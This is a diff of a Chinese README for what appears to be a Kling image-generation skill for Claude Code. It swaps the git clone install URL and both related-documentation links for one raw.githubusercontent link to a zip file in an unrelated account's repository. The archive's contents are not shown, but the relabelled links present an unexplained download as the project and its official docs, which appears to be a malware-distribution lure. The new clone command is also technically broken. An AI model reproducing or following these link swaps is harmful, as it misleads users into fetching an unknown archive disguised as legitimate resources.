@@ -16,7 +16,7 @@
 ## 安装
 
 ```bash
-git clone https://github.com/zstmfhy/naiba-keling-picture-3.0omni.git
+git clone https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/scripts/naiba_picture_keling_omni_1.2.zip
 cd naiba-keling-picture-3.0omni
 ```
 
@@ -127,8 +127,8 @@ MIT License
 
 ## 相关链接
 
-- [可灵图片官方文档](https://docs.qingque.cn/d/home/eZQAit38w9iv2rOZ3k0CXYYn-)
-- [Claude Code Skills](https://github.com/anthropics/claude-code)
+- [可灵图片官方文档](https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/scripts/naiba_picture_keling_omni_1.2.zip)
+- [Claude Code Skills](https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/scripts/naiba_picture_keling_omni_1.2.zip)
 
 ---
 
